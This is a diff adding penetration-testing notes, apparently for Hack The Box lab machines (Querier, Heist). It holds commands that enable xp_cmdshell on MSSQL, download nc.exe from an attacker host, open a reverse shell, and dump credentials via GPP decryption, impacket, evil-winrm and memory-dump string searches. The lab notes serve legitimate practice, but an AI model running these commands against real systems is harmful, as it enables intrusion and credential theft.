@@ -113,9 +113,28 @@
 
 ## Now enable xp-cmdshell
 
+## mssqlclient.py reporting@querier.htb -db volume -windows-auth
+## enable_xp_cmdshell
+## EXEC xp_cmdshell 'whoami'
+
+## copy the nc from python server
+## SQL> EXEC xp_cmdshell 'powershell.exe Invoke-WebRequest -o C:\Users\mssql-svc\appdata\local\temp\nc.exe http://10.10.xx.xx/nc.exe'
+
+## Get the reverse shell
+## EXEC xp_cmdshell 'C:\Users\mssql-svc\appdata\local\temp\nc.exe -e cmd.exe 10.10.xx.xx 1337'
+
+## check the group policy files crack it through gppdecrypt get the administrator password
+## use the psexec from impacket to get root
+
+## use lookupsid.py from impacket to enumerate the other users with creds
+## lookupsid.py hazard:stealth1agent@heist.htb
+
+## authenticate with win-rm
+## evil-winrm -i hostname -u user -s option -e option
+## upload and download through winrm
 
 
-
-
+## cmd /c "strings64.exe -accepteula firefox.exe_191129_211531.dmp > firefox.exe_191129_211531.txt"
+## findstr "password" ./firefox.exe_191129_211531.txt
 
 
